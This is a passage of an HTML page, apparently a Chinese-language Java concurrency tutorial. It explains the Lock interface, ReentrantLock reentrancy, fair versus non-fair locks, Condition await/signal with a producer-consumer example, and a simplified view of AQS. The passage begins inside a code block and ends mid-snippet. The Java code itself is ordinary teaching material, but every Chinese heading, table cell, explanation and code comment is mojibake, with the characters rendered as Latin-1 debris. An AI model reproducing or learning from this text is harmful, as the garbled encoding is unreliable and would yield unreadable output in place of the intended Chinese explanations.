    <span class="hljs-keyword">void</span> <span class="hljs-title function_">lockInterruptibly</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// å¯ä¸­æ–­è·å–é”</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">()</span>;                  <span class="hljs-comment">// å°è¯•è·å–é”ï¼ˆä¸é˜»å¡ï¼‰</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// è¶…æ—¶è·å–é”</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span>;                      <span class="hljs-comment">// é‡Šæ”¾é”</span>
    Condition <span class="hljs-title function_">newCondition</span><span class="hljs-params">()</span>;           <span class="hljs-comment">// è·å–æ¡ä»¶å¯¹è±¡</span>
}
</code></pre>
<p><strong>æ–¹æ³•è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>lock()</strong> - æœ€å¸¸ç”¨çš„æ–¹æ³•ï¼Œè·å–é”ï¼Œå¦‚æœé”è¢«å ç”¨åˆ™é˜»å¡ç­‰å¾…</li>
<li><strong>lockInterruptibly()</strong> - å¯ä¸­æ–­çš„è·å–é”ï¼Œçº¿ç¨‹åœ¨ç­‰å¾…æ—¶å¯ä»¥è¢«ä¸­æ–­</li>
<li><strong>tryLock()</strong> - å°è¯•è·å–é”ï¼Œç«‹å³è¿”å›true/falseï¼Œä¸ä¼šé˜»å¡</li>
<li><strong>tryLock(time, unit)</strong> - åœ¨æŒ‡å®šæ—¶é—´å†…å°è¯•è·å–é”ï¼Œè¶…æ—¶è¿”å›false</li>
<li><strong>unlock()</strong> - é‡Šæ”¾é”ï¼Œå¿…é¡»åœ¨finallyå—ä¸­è°ƒç”¨</li>
<li><strong>newCondition()</strong> - åˆ›å»ºConditionå¯¹è±¡ï¼Œç”¨äºçº¿ç¨‹é—´çš„åè°ƒ</li>
</ol>
<h4 data-id="heading-153">Lock vs synchronized</h4>








































<table><thead><tr><th>ç‰¹æ€§</th><th>synchronized</th><th>Lock</th></tr></thead><tbody><tr><td><strong>è·å–é”æ–¹å¼</strong></td><td>è‡ªåŠ¨è·å–å’Œé‡Šæ”¾</td><td>æ‰‹åŠ¨è·å–å’Œé‡Šæ”¾</td></tr><tr><td><strong>å¯ä¸­æ–­</strong></td><td>âŒ ä¸å¯ä¸­æ–­</td><td>âœ… å¯ä¸­æ–­ï¼ˆlockInterruptiblyï¼‰</td></tr><tr><td><strong>è¶…æ—¶è·å–</strong></td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒï¼ˆtryLockï¼‰</td></tr><tr><td><strong>å…¬å¹³é”</strong></td><td>âŒ éå…¬å¹³</td><td>âœ… å¯é€‰å…¬å¹³/éå…¬å¹³</td></tr><tr><td><strong>å¤šä¸ªæ¡ä»¶</strong></td><td>âŒ åªæœ‰ä¸€ä¸ªæ¡ä»¶</td><td>âœ… å¯ä»¥æœ‰å¤šä¸ªCondition</td></tr><tr><td><strong>ä½¿ç”¨å¤æ‚åº¦</strong></td><td>ç®€å•</td><td>è¾ƒå¤æ‚ï¼ˆéœ€è¦finallyé‡Šæ”¾ï¼‰</td></tr></tbody></table>
<p><strong>ä½¿ç”¨ç¤ºä¾‹å¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// synchronizedæ–¹å¼ï¼ˆç®€å•ä½†åŠŸèƒ½æœ‰é™ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// åŒæ­¥ä»£ç </span>
}

<span class="hljs-comment">// Lockæ–¹å¼ï¼ˆæ›´çµæ´»ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// åŒæ­¥ä»£ç </span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock(); <span class="hljs-comment">// âš ï¸ å¿…é¡»åœ¨finallyä¸­é‡Šæ”¾ï¼Œé˜²æ­¢æ­»é”</span>
    }
}

<span class="hljs-comment">// å¯ä¸­æ–­çš„è·å–é”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">interruptibleMethod</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lockInterruptibly();  <span class="hljs-comment">// ç­‰å¾…æ—¶å¯ä»¥å“åº”ä¸­æ–­</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// åŒæ­¥ä»£ç </span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}

<span class="hljs-comment">// å°è¯•è·å–é”ï¼ˆä¸é˜»å¡ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tryLockMethod</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (lock.tryLock()) {  <span class="hljs-comment">// ç«‹å³è¿”å›ï¼Œä¸ç­‰å¾…</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// åŒæ­¥ä»£ç </span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// è·å–é”å¤±è´¥ï¼Œæ‰§è¡Œå…¶ä»–é€»è¾‘</span>
    }
}
</code></pre>
<h3 data-id="heading-154">7.2 ReentrantLock</h3>
<h4 data-id="heading-155">å¯é‡å…¥æ€§</h4>
<p><strong>å¯é‡å…¥é”ï¼š</strong> åŒä¸€ä¸ªçº¿ç¨‹å¯ä»¥å¤šæ¬¡è·å–åŒä¸€æŠŠé”ã€‚</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>å°±åƒä¸€æŠŠé’¥åŒ™å¯ä»¥æ‰“å¼€åŒä¸€æ‰‡é—¨å¤šæ¬¡</li>
<li>é¿å…æ­»é”ï¼šæ–¹æ³•Aè°ƒç”¨æ–¹æ³•Bï¼Œä¸¤ä¸ªæ–¹æ³•éƒ½éœ€è¦åŒä¸€æŠŠé”</li>
<li>ReentrantLockæ˜¯å¯é‡å…¥çš„ï¼Œsynchronizedä¹Ÿæ˜¯å¯é‡å…¥çš„</li>
</ul>
<p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
    lock.lock();  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è·å–é”</span>
    <span class="hljs-keyword">try</span> {
        method2();  <span class="hljs-comment">// è°ƒç”¨method2ï¼Œå¯ä»¥å†æ¬¡è·å–åŒä¸€æŠŠé”</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡é‡Šæ”¾</span>
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
    lock.lock();  <span class="hljs-comment">// ç¬¬äºŒæ¬¡è·å–é”ï¼ˆå¯é‡å…¥ï¼‰</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();  <span class="hljs-comment">// ç¬¬äºŒæ¬¡é‡Šæ”¾</span>
    }
}
</code></pre>
<p><strong>å®ç°åŸç†ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨stateè®°å½•é‡å…¥æ¬¡æ•°</li>
<li>æ¯æ¬¡lock()ï¼Œstate + 1</li>
<li>æ¯æ¬¡unlock()ï¼Œstate - 1</li>
<li>state == 0æ—¶ï¼Œé”è¢«å®Œå…¨é‡Šæ”¾</li>
</ul>
<h4 data-id="heading-156">å…¬å¹³é”ä¸éå…¬å¹³é”</h4>
<p><strong>æ ¸å¿ƒåŒºåˆ«ï¼š</strong> è·å–é”çš„é¡ºåºä¸åŒ</p>
<h5 data-id="heading-157">éå…¬å¹³é”ï¼ˆé»˜è®¤ï¼‰</h5>
<p><strong>ç‰¹ç‚¹ï¼š</strong> æ–°æ¥çš„çº¿ç¨‹å¯èƒ½"æ’é˜Ÿ"ï¼Œç›´æ¥å°è¯•è·å–é”</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();  <span class="hljs-comment">// é»˜è®¤éå…¬å¹³é”</span>
<span class="hljs-comment">// æˆ–</span>
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">false</span>);  <span class="hljs-comment">// æ˜¾å¼æŒ‡å®šéå…¬å¹³é”</span>
</code></pre>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// éå…¬å¹³é”ï¼šå…ˆå°è¯•ç›´æ¥è·å–é”ï¼Œå¤±è´¥æ‰æ’é˜Ÿ</span>
lock() {
    <span class="hljs-keyword">if</span> (CASå°è¯•ç›´æ¥è·å–é”) {  <span class="hljs-comment">// æ–°çº¿ç¨‹å¯èƒ½æ’é˜Ÿ</span>
        <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// æˆåŠŸ</span>
    }
    åŠ å…¥é˜Ÿåˆ—ç­‰å¾…;  <span class="hljs-comment">// å¤±è´¥æ‰æ’é˜Ÿ</span>
}
</code></pre>
<p><strong>ä¼˜ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>âœ… æ€§èƒ½æ›´å¥½ï¼ˆå‡å°‘çº¿ç¨‹åˆ‡æ¢ï¼‰</li>
<li>âœ… ååé‡æ›´é«˜</li>
<li>âŒ å¯èƒ½å¯¼è‡´çº¿ç¨‹é¥¥é¥¿ï¼ˆæŸäº›çº¿ç¨‹ä¸€ç›´è·å–ä¸åˆ°é”ï¼‰</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> å¤§å¤šæ•°åœºæ™¯æ¨èä½¿ç”¨éå…¬å¹³é”</p>
<h5 data-id="heading-158">å…¬å¹³é”</h5>
<p><strong>ç‰¹ç‚¹ï¼š</strong> ä¸¥æ ¼æŒ‰ç…§ç­‰å¾…æ—¶é—´é¡ºåºè·å–é”ï¼Œå…ˆæ¥å…ˆæœåŠ¡</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// å…¬å¹³é”</span>
</code></pre>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å…¬å¹³é”ï¼šå…ˆæ£€æŸ¥é˜Ÿåˆ—ï¼Œæœ‰ç­‰å¾…çš„çº¿ç¨‹å°±æ’é˜Ÿ</span>
lock() {
    <span class="hljs-keyword">if</span> (é˜Ÿåˆ—ä¸­æœ‰ç­‰å¾…çš„çº¿ç¨‹) {
        åŠ å…¥é˜Ÿåˆ—ç­‰å¾…;  <span class="hljs-comment">// ä¸æ’é˜Ÿ</span>
    } <span class="hljs-keyword">else</span> {
        å°è¯•è·å–é”;
    }
}
</code></pre>
<p><strong>ä¼˜ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>âœ… å…¬å¹³æ€§ä¿è¯ï¼Œé¿å…é¥¥é¥¿</li>
<li>âœ… ç­‰å¾…æ—¶é—´é•¿çš„çº¿ç¨‹ä¼˜å…ˆè·å¾—é”</li>
<li>âŒ æ€§èƒ½è¾ƒå·®ï¼ˆæ›´å¤šä¸Šä¸‹æ–‡åˆ‡æ¢ï¼‰</li>
<li>âŒ ååé‡è¾ƒä½</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> éœ€è¦ä¸¥æ ¼å…¬å¹³æ€§çš„åœºæ™¯</p>
<p><strong>æ€§èƒ½å¯¹æ¯”æ€»ç»“ï¼š</strong></p>
<ul>
<li><strong>éå…¬å¹³é”</strong>ï¼šæ€§èƒ½å¥½ï¼ˆçº¦å¿«10-20%ï¼‰ï¼Œé€‚åˆå¤§å¤šæ•°åœºæ™¯</li>
<li><strong>å…¬å¹³é”</strong>ï¼šæ€§èƒ½å·®ï¼Œä½†æ›´å…¬å¹³ï¼Œé€‚åˆå¯¹å…¬å¹³æ€§è¦æ±‚é«˜çš„åœºæ™¯</li>
<li><strong>é€‰æ‹©å»ºè®®</strong>ï¼šé™¤éæœ‰ç‰¹æ®Šéœ€æ±‚ï¼Œå¦åˆ™ä½¿ç”¨éå…¬å¹³é”</li>
</ul>
<h3 data-id="heading-159">7.3 Conditionæ¥å£</h3>
<h4 data-id="heading-160">Conditionçš„ä½œç”¨</h4>
<p><strong>Condition</strong>æä¾›äº†ç±»ä¼¼Object.wait/notifyçš„çº¿ç¨‹ç­‰å¾…å’Œå”¤é†’æœºåˆ¶ï¼Œä½†åŠŸèƒ½æ›´å¼ºå¤§ã€‚</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>Conditionæ˜¯Lockçš„ç­‰å¾…/é€šçŸ¥æœºåˆ¶</li>
<li>ä¸€ä¸ªLockå¯ä»¥åˆ›å»ºå¤šä¸ªCondition</li>
<li>æ¯”wait/notifyæ›´çµæ´»ã€æ›´ç²¾ç¡®</li>
</ul>
<p><strong>Conditionæ¥å£æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Condition</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">await</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException;              <span class="hljs-comment">// ç­‰å¾…ï¼Œå¯ä¸­æ–­</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">awaitUninterruptibly</span><span class="hljs-params">()</span>;                          <span class="hljs-comment">// ç­‰å¾…ï¼Œä¸å¯ä¸­æ–­</span>
    <span class="hljs-type">long</span> <span class="hljs-title function_">awaitNanos</span><span class="hljs-params">(<span class="hljs-type">long</span> nanosTimeout)</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// è¶…æ—¶ç­‰å¾…ï¼ˆçº³ç§’ï¼‰</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">await</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// è¶…æ—¶ç­‰å¾…</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">awaitUntil</span><span class="hljs-params">(Date deadline)</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// ç­‰å¾…åˆ°æŒ‡å®šæ—¶é—´</span>
    
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">signal</span><span class="hljs-params">()</span>;        <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">signalAll</span><span class="hljs-params">()</span>;     <span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹</span>
}
</code></pre>
<h4 data-id="heading-161">await()æ–¹æ³•ï¼ˆç­‰å¾…æ¡ä»¶ï¼‰</h4>
<p><strong>ä½œç”¨ï¼š</strong> è®©å½“å‰çº¿ç¨‹ç­‰å¾…ï¼Œç›´åˆ°è¢«signalå”¤é†’</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">Condition</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> lock.newCondition();

<span class="hljs-comment">// ç­‰å¾…æ¡ä»¶</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.await();  <span class="hljs-comment">// é‡Šæ”¾é”å¹¶ç­‰å¾…ï¼Œè¢«å”¤é†’åé‡æ–°è·å–é”</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<ol>
<li>å½“å‰çº¿ç¨‹åŠ å…¥æ¡ä»¶ç­‰å¾…é˜Ÿåˆ—</li>
<li>é‡Šæ”¾é”</li>
<li>é˜»å¡ç­‰å¾…</li>
<li>è¢«signalå”¤é†’åï¼Œé‡æ–°è·å–é”</li>
<li>ç»§ç»­æ‰§è¡Œ</li>
</ol>
<h4 data-id="heading-162">signal()/signalAll()æ–¹æ³•ï¼ˆå”¤é†’ç­‰å¾…çº¿ç¨‹ï¼‰</h4>
<p><strong>signal()ï¼š</strong> å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹ï¼ˆç±»ä¼¼notifyï¼‰<br/>
<strong>signalAll()ï¼š</strong> å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹ï¼ˆç±»ä¼¼notifyAllï¼‰</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signal();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}

<span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signalAll();  <span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çš„çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<h4 data-id="heading-163">Condition vs wait/notify</h4>



































<table><thead><tr><th>ç‰¹æ€§</th><th>wait/notify</th><th>Condition</th></tr></thead><tbody><tr><td><strong>å‰ç½®æ¡ä»¶</strong></td><td>å¿…é¡»åœ¨synchronizedå—ä¸­</td><td>å¿…é¡»å…ˆè·å–Lock</td></tr><tr><td><strong>å¤šä¸ªæ¡ä»¶</strong></td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒï¼ˆä¸€ä¸ªLockå¤šä¸ªConditionï¼‰</td></tr><tr><td><strong>å¯ä¸­æ–­</strong></td><td>âœ… æ”¯æŒ</td><td>âœ… æ”¯æŒ</td></tr><tr><td><strong>è¶…æ—¶ç­‰å¾…</strong></td><td>âœ… æœ‰é™æ”¯æŒ</td><td>âœ… æ›´çµæ´»çš„è¶…æ—¶</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>ç®€å•çš„ç­‰å¾…/é€šçŸ¥</td><td>å¤æ‚çš„åŒæ­¥æ§åˆ¶</td></tr></tbody></table>
<p><strong>ä¼˜åŠ¿æ€»ç»“ï¼š</strong></p>
<ul>
<li>âœ… <strong>å¤šä¸ªæ¡ä»¶</strong>ï¼šå¯ä»¥åˆ›å»ºå¤šä¸ªConditionï¼Œç²¾ç¡®æ§åˆ¶ä¸åŒæ¡ä»¶çš„ç­‰å¾…/å”¤é†’</li>
<li>âœ… <strong>æ›´çµæ´»</strong>ï¼šè¶…æ—¶ç­‰å¾…ã€ä¸­æ–­æ§åˆ¶æ›´å¼ºå¤§</li>
<li>âœ… <strong>æ€§èƒ½æ›´å¥½</strong>ï¼šé¿å…ä¸å¿…è¦çš„çº¿ç¨‹å”¤é†’</li>
</ul>
<h4 data-id="heading-164">ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å¼å®ç°</h4>
<p><strong>ä½¿ç”¨Conditionçš„ä¼˜åŠ¿ï¼š</strong> å¯ä»¥ä¸º"é˜Ÿåˆ—æ»¡"å’Œ"é˜Ÿåˆ—ç©º"åˆ›å»ºä¸åŒçš„Condition</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">Condition</span> <span class="hljs-variable">notFull</span> <span class="hljs-operator">=</span> lock.newCondition();   <span class="hljs-comment">// é˜Ÿåˆ—ä¸æ»¡çš„æ¡ä»¶</span>
<span class="hljs-type">Condition</span> <span class="hljs-variable">notEmpty</span> <span class="hljs-operator">=</span> lock.newCondition();  <span class="hljs-comment">// é˜Ÿåˆ—ä¸ç©ºçš„æ¡ä»¶</span>

<span class="hljs-comment">// ç”Ÿäº§è€…ï¼šç­‰å¾…é˜Ÿåˆ—ä¸æ»¡ï¼Œé€šçŸ¥é˜Ÿåˆ—ä¸ç©º</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(Object x)</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">while</span> (count == items.length)
            notFull.await();  <span class="hljs-comment">// ç­‰å¾…é˜Ÿåˆ—ä¸æ»¡</span>
        <span class="hljs-comment">// ç”Ÿäº§...</span>
        notEmpty.signal();    <span class="hljs-comment">// é€šçŸ¥æ¶ˆè´¹è€…ï¼šé˜Ÿåˆ—ä¸ç©ºäº†</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}

<span class="hljs-comment">// æ¶ˆè´¹è€…ï¼šç­‰å¾…é˜Ÿåˆ—ä¸ç©ºï¼Œé€šçŸ¥é˜Ÿåˆ—ä¸æ»¡</span>
<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">take</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>)
            notEmpty.await();  <span class="hljs-comment">// ç­‰å¾…é˜Ÿåˆ—ä¸ç©º</span>
        <span class="hljs-comment">// æ¶ˆè´¹...</span>
        notFull.signal();      <span class="hljs-comment">// é€šçŸ¥ç”Ÿäº§è€…ï¼šé˜Ÿåˆ—ä¸æ»¡äº†</span>
        <span class="hljs-keyword">return</span> item;
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>ç²¾ç¡®å”¤é†’ï¼šåªå”¤é†’éœ€è¦ç­‰å¾…è¯¥æ¡ä»¶çš„çº¿ç¨‹</li>
<li>é¿å…è™šå‡å”¤é†’ï¼šä½¿ç”¨whileå¾ªç¯æ£€æŸ¥æ¡ä»¶</li>
<li>æ€§èƒ½æ›´å¥½ï¼šä¸éœ€è¦å”¤é†’æ‰€æœ‰çº¿ç¨‹</li>
</ul>
<h3 data-id="heading-165">7.4 ReentrantLockçš„å®ç°åŸç†</h3>
<h4 data-id="heading-166">åŸºäºAQSçš„å®ç°</h4>
<p><strong>ReentrantLockå†…éƒ¨ç»“æ„ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Lock</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Sync sync;  <span class="hljs-comment">// å†…éƒ¨åŒæ­¥å™¨ï¼Œç»§æ‰¿è‡ªAQS</span>
    
    <span class="hljs-comment">// å…¬å¹³é”å’Œéå…¬å¹³é”éƒ½ç»§æ‰¿è‡ªSync</span>
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span>;  <span class="hljs-comment">// ç”±å­ç±»å®ç°ï¼ˆå…¬å¹³/éå…¬å¹³ï¼‰</span>
        
        <span class="hljs-comment">// å°è¯•è·å–é”ï¼ˆéå…¬å¹³æ–¹å¼ï¼‰</span>
        <span class="hljs-type">boolean</span> <span class="hljs-title function_">nonfairTryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
            <span class="hljs-comment">// 1. æ£€æŸ¥é”æ˜¯å¦ç©ºé—²</span>
            <span class="hljs-comment">// 2. CASå°è¯•è·å–é”</span>
            <span class="hljs-comment">// 3. æ”¯æŒå¯é‡å…¥</span>
        }
        
        <span class="hljs-comment">// é‡Šæ”¾é”</span>
        <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
            <span class="hljs-comment">// 1. æ£€æŸ¥æ˜¯å¦æ˜¯æŒæœ‰é”çš„çº¿ç¨‹</span>
            <span class="hljs-comment">// 2. stateå‡1</span>
            <span class="hljs-comment">// 3. å¦‚æœstateä¸º0ï¼Œå®Œå…¨é‡Šæ”¾</span>
        }
    }
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>ReentrantLockå†…éƒ¨ä½¿ç”¨AQSå®ç°</li>
<li>å…¬å¹³é”å’Œéå…¬å¹³é”åˆ†åˆ«å®ç°ä¸åŒçš„è·å–ç­–ç•¥</li>
<li>æ‰€æœ‰é”æ“ä½œæœ€ç»ˆéƒ½è°ƒç”¨AQSçš„æ–¹æ³•</li>
</ul>
<h4 data-id="heading-167">å…¬å¹³é”çš„è·å–æµç¨‹</h4>
<p><strong>æ ¸å¿ƒåŒºåˆ«ï¼šè·å–é”å‰å…ˆæ£€æŸ¥é˜Ÿåˆ—</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å…¬å¹³é”ï¼šå…ˆæ£€æŸ¥é˜Ÿåˆ—ï¼Œæœ‰ç­‰å¾…çš„å°±ä¸æ’é˜Ÿ</span>
lock() {
    acquire(<span class="hljs-number">1</span>);  <span class="hljs-comment">// è°ƒç”¨AQSçš„acquire</span>
}

tryAcquire(<span class="hljs-number">1</span>) {
    <span class="hljs-keyword">if</span> (é”ç©ºé—²) {
        <span class="hljs-keyword">if</span> (é˜Ÿåˆ—ä¸­æœ‰ç­‰å¾…çš„çº¿ç¨‹) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// æœ‰ç­‰å¾…çš„ï¼Œä¸æ’é˜Ÿ</span>
        }
        CASè·å–é”;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-comment">// å¯é‡å…¥å¤„ç†...</span>
}
</code></pre>
<p><strong>æµç¨‹æ€»ç»“ï¼š</strong></p>
<ol>
<li>æ£€æŸ¥é”æ˜¯å¦ç©ºé—²</li>
<li><strong>å…³é”®ï¼šæ£€æŸ¥é˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰ç­‰å¾…çš„çº¿ç¨‹</strong></li>
<li>å¦‚æœæœ‰ç­‰å¾…çš„ï¼Œä¸æ’é˜Ÿï¼Œè¿”å›falseï¼ŒåŠ å…¥é˜Ÿåˆ—ç­‰å¾…</li>
<li>å¦‚æœæ²¡æœ‰ç­‰å¾…çš„ï¼ŒCASè·å–é”</li>
</ol>
<h4 data-id="heading-168">éå…¬å¹³é”çš„è·å–æµç¨‹</h4>
<p><strong>æ ¸å¿ƒåŒºåˆ«ï¼šæ–°çº¿ç¨‹å¯èƒ½æ’é˜Ÿ</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// éå…¬å¹³é”ï¼šå…ˆå°è¯•ç›´æ¥è·å–ï¼Œå¤±è´¥æ‰æ’é˜Ÿ</span>
lock() {
    <span class="hljs-keyword">if</span> (CASç›´æ¥å°è¯•è·å–é”) {  <span class="hljs-comment">// æ–°çº¿ç¨‹å¯èƒ½æ’é˜Ÿ</span>
        <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// æˆåŠŸ</span>
    }
    acquire(<span class="hljs-number">1</span>);  <span class="hljs-comment">// å¤±è´¥æ‰è°ƒç”¨AQSçš„acquire</span>
}

tryAcquire(<span class="hljs-number">1</span>) {
    <span class="hljs-keyword">if</span> (é”ç©ºé—²) {
